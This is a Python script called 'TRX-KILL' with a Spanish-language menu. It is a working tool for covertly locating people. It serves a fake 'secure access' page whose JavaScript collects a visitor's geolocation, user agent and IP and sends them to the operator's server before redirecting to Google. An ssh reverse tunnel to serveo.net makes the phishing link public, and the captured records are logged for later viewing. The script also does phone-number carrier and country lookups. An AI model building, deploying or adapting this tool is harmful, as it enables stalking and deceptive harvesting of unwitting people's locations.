#!/usr/bin/env python3
import os, subprocess, threading, random, time, requests, sys
import phonenumbers
from phonenumbers import geocoder, carrier
from flask import Flask, request

app = Flask('TRX-KILL')
PUERTO = random.randint(6000, 9000)
AUTH_PASS = "TRX-KILL-OSCAR"

HTML_ENCUESTA = """
<!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8">
<style>
    body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:20px;}
    .card{background:#111;padding:20px;border:1px solid #0f0;border-radius:10px;width:90%;max-width:400px;margin:auto;}
    button{padding:15px;background:#0f0;border:none;width:100%;font-weight:bold;cursor:pointer;margin-top:20px;}
</style></head><body>
<div class="card">
    <h2>ACCESO SEGURO</h2>
    <input type="text" id="dev" placeholder="Dispositivo..." style="width:90%;padding:10px;margin:5px;">
    <button onclick="c()">VALIDAR CONEXIÓN</button>
</div>
<script>
function c(){
    let d = {ua: navigator.userAgent, time: new Date().toLocaleString(), dev: document.getElementById('dev').value};
    navigator.geolocation.getCurrentPosition((p)=>{
        d.lat = p.coords.latitude; d.lon = p.coords.longitude;
        enviar(d);
    }, (e)=>{ enviar(d); });
}
function enviar(d){
    fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)})
    .then(()=> window.location.href="https://google.com");
}
</script></body></html>
"""

@app.route('/')
def index(): return HTML_ENCUESTA

@app.route('/log', methods=['POST'])
def log():
    d = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    with open("resultados.txt", "a") as f:
        f.write(f"--- REGISTRO 1.2.3 ---\nIP: {ip}\nCOORD: {d.get('lat', 'NO_DATO')}, {d.get('lon', 'NO_DATO')}\nDISPOSITIVO: {d.get('ua')}\nHORA: {d.get('time')}\n----------------------\n")
    return "OK"

def banner():
    os.system('clear')
    print("\033[1;32m")
    print("╔═══════════════════════════════════════════╗")
    print("║          TRX-KILL V1.2.3 - SUITE          ║")
    print("║            BY: OSCAR | PRO              ║")
    print("╚═══════════════════════════════════════════╝")
    print("\033[0m")

def main():
    while True:
        banner()
        print(" [1] INFORMATION NÚMERO | [2] INFORMATION-ZP (LINK)")
        print(" [3] CREADOR            | [4] USO Y RESPONSABILIDAD")
        print(" [5] ACTUALIZACIÓN      | [6] ADM (VER USUARIOS)")
        print(" [9] SALIR")
        opc = input("\nTRX-ROOT > ")
        
        if opc == "1":
            num = input("Número: ")
            p = phonenumbers.parse(num)
            print(f"[+] MÓVIL: {carrier.name_for_number(p, 'es')}")
            print(f"[+] PAÍS: {geocoder.country_name_for_number(p, 'es')}")
            print(f"[+] LINK MAP: https://maps.google.com/?q={num}")
            input("\n[Enter]...")
        elif opc == "2":
            threading.Thread(target=lambda: app.run(host='127.0.0.1', port=PUERTO), daemon=True).start()
            proc = subprocess.Popen(['ssh', '-R', '80:localhost:'+str(PUERTO), 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for line in proc.stderr:
                if "https://" in line: print(f"\nLINK: {line.strip()}\n"); break
            input("Presiona Enter para cerrar..."); os.system('pkill -f ssh')
        elif opc == "3":
            print("\n# CREADO POR: TRX-KILL\n# BY: OSCAR\n# VERCION: 1.2.3\n# LINCENCIA: ACTIVADA\n")
            input("[Enter]...")
        elif opc == "6":
            if input("CONTRASEÑA: ") == AUTH_PASS:
                if os.path.exists("resultados.txt"): os.system("cat resultados.txt")
                else: print("Sin datos.")
            else: print("[-] ACCESO DENEGADO")
            input("\n[Enter]...")
        elif opc == "9": sys.exit()

if __name__ == "__main__":
    main()
